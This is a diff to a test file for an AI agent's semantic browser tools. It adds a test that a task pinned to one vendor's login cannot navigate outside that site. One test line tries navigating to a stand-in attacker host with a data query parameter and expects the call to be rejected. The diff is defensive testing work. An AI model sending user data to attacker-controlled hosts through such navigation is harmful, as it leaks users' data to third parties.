@@ -11,6 +11,8 @@ import {
   withEvaluableDynamic,
 } from "@tests/helpers/dynamic";
 import { resetEveState } from "@tests/helpers/eve-state";
+import { sitePrincipal } from "@agent/lib/site-principal";
+import { accessScopeForUser } from "@shared/identity/access-scope";
 import { toolContextFor } from "@tests/helpers/tool-context";
 
 const mocks = vi.hoisted(() => ({
@@ -75,12 +77,13 @@ async function call(
   name: string,
   input: Readonly<
     Record<string, string | readonly Readonly<Record<string, string>>[]>
-  >
+  >,
+  auth?: EveTools.ToolContext["session"]["auth"]
 ) {
   const tool = dynamicTool(await tools(), name);
   return tool.execute(
     { session_id: "browser-1", ...input },
-    toolContextFor({ sessionId: "worker-1", toolName: name })
+    toolContextFor({ auth, sessionId: "worker-1", toolName: name })
   );
 }
 
@@ -125,6 +128,40 @@ describe("semantic browser tools", () => {
 
     await call("browser_navigate", { url: "back" });
     await call("browser_navigate", { url: "https://example.org/" });
+    expect(mocks.executeBrowserLoopTool).toHaveBeenCalledTimes(2);
+  });
+
+  it("lets a pinned site task navigate only inside its login's site", async () => {
+    const owner = accessScopeForUser("better-auth:owner-1");
+    const initiator = sitePrincipal(
+      {
+        login: { id: "login-1", origin: "https://login.vendor.com" },
+        op: "create",
+        site: "teemiq",
+      },
+      "owner@example.test",
+      owner
+    );
+    // The owner writing into the task later does not lift the fence.
+    const member = {
+      attributes: { workspaceId: owner.workspaceId },
+      authenticator: "authjs",
+      principalId: owner.userId,
+      principalType: "user",
+    };
+    const auth = { current: member, initiator };
+
+    await expect(
+      call("browser_navigate", { url: "https://attacker.example/?d=x" }, auth)
+    ).rejects.toThrow(/attacker\.example is outside vendor\.com/u);
+    expect(mocks.executeBrowserLoopTool).not.toHaveBeenCalled();
+
+    await call(
+      "browser_navigate",
+      { url: "https://billing.vendor.com/invoices" },
+      auth
+    );
+    await call("browser_navigate", { url: "back" }, auth);
     expect(mocks.executeBrowserLoopTool).toHaveBeenCalledTimes(2);
   });
 
